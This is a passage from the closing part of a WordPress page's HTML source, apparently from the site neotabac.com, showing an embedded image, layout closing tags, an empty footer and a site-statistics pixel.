A3yAaAiz3V9eAs2HWoQpefCD2LLLNAAbFfiqOctokRDZV5dpr5RkfL58P0oGnweDQrXYFHkEdPYAQ0mVrgG7ICGHcShDPX5SRgN+TxFBiooc6nhKT0n1GAWaQAPVSnMjnDepUyDtDanVqGvSgV89H4cDYDSDUzsYx4NHo+GcayBR8MY+bxb0ETvwDW4bhBGg6VANMiFGuAIM/LwbV3kBRhMl2uotucSDsWTIqWr71lJNGAVdSlFYw8SpIICzDX0DJcirsH3kawy6mJIkBolAaKaBxpcuauNITf0Yg1kWsPjH374LuZiFVrEk+Py8w3AylzCoeSmzY/fw70+aAg9aDJCckBUWGmW12UEK4ozNrCjdfsOf5c6js9X2KYI9X3QwOcAMMeiiu2OZWxlJ/0Mn+zv/5Rme2F7f/9JouFwfPVz6QTzeizodamQhUs+FTPhAM8XIwXsYQtbxMM2bFk2thx40yXYdm3HJcTi5xgsE5a27Tqm7QKmCd+Evz09IXA4HMKCw5fPRocjftEm1tBjVxIN886Sg42Smxdql1SmQO3CcEgdWnh4CoKJFY+r+bdtmYKkQMxo98m5T/AKERuJhf29y5fyNUiLv+SR8nnondKHl3/NNFl1XeyJcCieKAsWMphZSLgsnh6aN0v2cEd95yspn+WtV+pBb5d9yCdof4eNxZxp24qxJzgRJSecTuDOPGd6j7HPpSIar7K7KH5eWswXdExl7ZXOoH82C08P9+j4QsnfaPnOK8uTg3bJ04Ij3lYoleWxlsfPuutGO5gBmCdM6fmyhx9IlfWfd9PENLp+45QnhQn+el5RFNl4dezNgLyj9M5/JZVSX7nzyzMlf/7RbLcK/u03hvzrY1w8/WPLa2u39V/SNPSBfnttlicnhHz11vk3Es4l/Dbm3Mvxxrk3TuPiW7N9QGNttdkZ/LyY0AeD9o3VWdpDilo1oVatJVT562WoCiqVapraNCVDmWnqiyvrtzuDl6Zze31l8SX+nde85jVnkv8BdhKUR+gaE60AAAAASUVORK5CYII=" loading="lazy" decoding="async" width="262" height="192" data-src="https://neotabac.com/wp-content/uploads/2023/10/telechargement__2_-removebg-preview-1.png" class="attachment-large size-large wp-image-571 entered litespeed-loaded" alt="" data-srcset="https://neotabac.com/wp-content/uploads/2023/10/telechargement__2_-removebg-preview-1.png 262w, https://neotabac.com/wp-content/uploads/2023/10/telechargement__2_-removebg-preview-1-64x47.png 64w" data-sizes="(max-width: 262px) 100vw, 262px" data-ll-status="loaded" sizes="" srcset="">
                                                                    <noscript>
                                                                        <img loading="lazy" decoding="async" width="262" height="192" src="https://neotabac.com/wp-content/uploads/2023/10/telechargement__2_-removebg-preview-1.png" class="attachment-large size-large wp-image-571" alt="" srcset="https://neotabac.com/wp-content/uploads/2023/10/telechargement__2_-removebg-preview-1.png 262w, https://neotabac.com/wp-content/uploads/2023/10/telechargement__2_-removebg-preview-1-64x47.png 64w" sizes="(max-width: 262px) 100vw, 262px">
                                                                    </noscript>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                    <div id="comments" class="comments-template"></div>
                                </div>
                            </div>
                        </article>
                    </div>
                </div>
            </div>
            <footer id="colophon" class="footer-credits container-fluid">
                <div class="container"></div>
            </footer>
        </div>
        <img src="data:image/gif;base64,R0lGODlhBgAFAIABAAAAAP///yH5BAEAAAEALAAAAAAGAAUAAAIJDGJ4ic1qgAwFADs=" alt="" width="6" height="5" id="wpstats">
        <span id="elementor-device-mode" class="elementor-screen-only"></span>
        <svg style="display:none" class="e-font-icon-svg-symbols"></svg>
</body>
</html>